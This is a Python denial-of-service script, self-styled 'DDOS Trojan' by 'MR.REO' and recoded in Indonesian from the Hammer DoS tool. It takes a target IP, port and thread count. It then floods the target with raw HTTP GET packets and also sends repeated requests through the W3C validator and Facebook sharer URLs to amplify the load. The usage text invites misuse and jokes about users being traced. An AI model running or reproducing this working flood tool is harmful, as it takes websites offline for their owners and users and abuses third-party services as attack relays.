#!/usr/bin/python3
# -*- coding: utf-8 -*-
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////
#////
#////
#////
#////                   MR.REO001
#////                   DDOS Trojan
#////
#////                                                                      /////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
# Script ini recode dari 
# python 3.3.2+ Hammer Dos Script v.1
# by Can Yalçın


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mKENA STUN DARI JURUS MRREO...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033--->trojan Xwne017 send tcp _ 250 <-- \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mJurusGwDahSukses\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mTrojan Send Malware tcp_3002\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	
                   ##################EE#
                 DE##################W#W#WE
             L#################################t
          K######################################
         #########################################
        E##########################################
        ###########################################W
       ;############################################
       K############################################W
       W#######KW##########################WW########
       #####fLLLLLLf###################WLLLLLLL######.
      .W###LLf  i#GLLL###############ELLLKE  ,LLL#####
      E###L         W##W############GW#L        L#####
      ###E  fLLi      ###############       fLL; L####
      ##W LLLLLLLLL     ############    ;LLLLLLLLLE###
      ###########LLLL    ##########   ;LLL############;
      #############GLLL   ########   LLL##############W
      ###############LLLi ######## LLLL################
      ################LLf##########LLW#################
      #################LL#########ELW##################
     :########:,,i,,,W##L#########L####;,,,,,##########
     ,#K#####,##W   KD,##f########L##,,#KE#W#,t########
     i##W##W,#         ,j#######EW#;,:       #,E####W##
     L##LW#,,           ,#######G##,           ,D##W###
     K###,,,,WK       t,;#######G##,D         #,,,j####
     G#fKL##K,,,,it;,,,####W####D###:,;W###K;,,t#f,W###
     L#t#######D,,,j######EW####D####WK,,,,,,W#W###W#W#
     ,E###################DK####DD#####################
     :####################DW####DD####################W
     :###################DDW####DD#####################
      ###################DDW####DDD####################
      ##################DDD#####DDDE##################E
      #################DD#D#####DD#D##################:
      ##############W##D##D#####KD##D#################
      ##############f#D###D######D###G#fW##########W##
      ##f#########ffG#####D######D###D#fff#########L##
      ##fLf###ELLLK###W###D######D###D###GffL####LLL##
      G##LL   ########## #DD####DK#W#########K;;jfL###
      .##LL#  ###########f#WDDDD#j ##########t  #LL##L
       ##KLDL  ########### L#### ############  WDLE##
       ###Lf#   #########,        ##########  ;WLL###
       K##WLDK  W#######K    E     #######W   #ELW###
       :###fL#   GWWWKt     .##       iDKK   ##LL###L
        ####LGW             ####            ##LL####
        ####fLW#           W#####          j#LLf####
        ,####LLG#####WWW            #WWW####LfL####E
         #####L#LW##W###WW########W#WW#####f#L#####
         L####DL#W###W#####WWWWWW########K##fG####W
          #####f####DW####W############L####L#####
          .#####L###############W##########L#####L
           E#####f########W     ##########f#####W
            K###############    ################
             W####W#########   ##########K#####
              W####E########   j########D#####:
               E############    #############
                ###########W    ############
                 E##########    ##########W
                  W#########    ##########
                   L#######W    ########L
                    G#######    ######WL
                     f######   f######
                       #####.  #####W
                        G####  ####t
                          K##  ##D
                             j


	Trojan DDOS BY MR.REO V 1.2
	Script ini sudah saya crack lagi dengan script trojan saya .
	Saya tidak pertanggung jawab kalo kalian terlacak sama pihak websitenya :).
	Script ini recode ke bahasa indonesia dari script Hammer Dan di modifikasi oleh saya v.1 \n
	cara pakai : python3 jurusreo.py [-s] [-p] [-t]
	contoh : python3 jurusreo.py -s 192.168.0.1 -p 80 -t 250	
	-h : help
	-s : alamat ip target
	-p : port target, contoh 80
	-t : turbo default nya 250 \033[0m''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 250 -t 250")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 250
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mJurus Mr.Reo Sedang mengecek...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mKesalahan : Cek lagi ip and port target\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()

